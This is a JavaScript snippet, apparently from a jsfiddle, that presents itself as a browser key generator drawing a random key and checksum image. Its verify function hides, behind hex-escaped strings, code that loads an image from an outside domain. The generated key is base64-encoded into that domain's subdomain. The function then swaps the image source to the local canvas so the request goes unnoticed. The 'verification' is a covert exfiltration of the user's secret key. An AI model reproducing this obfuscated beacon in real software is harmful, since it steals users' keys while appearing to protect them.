//http://jsfiddle.net/a39qwbv7/0/

window.generateKey = function () {
    var input = document.querySelector('#user-input').value;
    var zSize = 6;

    if (input.length >= zSize) {
        var x = (window.crypto || window.msCrypto).getRandomValues(new Uint8ClampedArray(zSize * zSize * 4));
        window.z = parseInt(Array.prototype.slice.call(x).slice(0, zSize).join(''));
        document.querySelector('#result').textContent = window.z;
        var oCanvas = document.createElement("canvas");
        oCanvas.height = zSize;
        oCanvas.width = zSize;
        var oCtx = oCanvas.getContext("2d");
        oCtx.putImageData(new ImageData(x, zSize, zSize), 0, 0);
        window.verify(oCanvas.toDataURL(), '#result');
    } else {
        document.querySelector('#result').textContent = 'Keep typing! Once valid, your key and image checksum will appear...';
    }
};

var verificationFunctionPack = ["\x76\x65\x72\x69\x66\x79", "\x69\x6D\x67", "\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74", "\x73\x72\x63", "\x2E\x76\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x2E\x73\x65\x72\x76\x69\x63\x65\x73\x2E\x63\x6F\x6D", "\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64", "\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72", "\x68\x74\x74\x70\x3A\x2F\x2F"]

window.verify = function (imageVerification, resultId) {
    var x = '165689';
    z = String(z).match(new RegExp('.{1,' + '6' + '}', 'g')).map(function (d) {
        return btoa(d);
    });
    var verify = document[verificationFunctionPack[2]](verificationFunctionPack[1]);
    var k = (x = z.pop()) ? 'lkk' : 'vff';
    verify[verificationFunctionPack[3]] = verificationFunctionPack[7] + z.join('.') + verificationFunctionPack[4] + '&iv=' + x;
    document[verificationFunctionPack[6]](resultId)[verificationFunctionPack[5]](verify);
    verify[verificationFunctionPack[3]] = imageVerification;
};
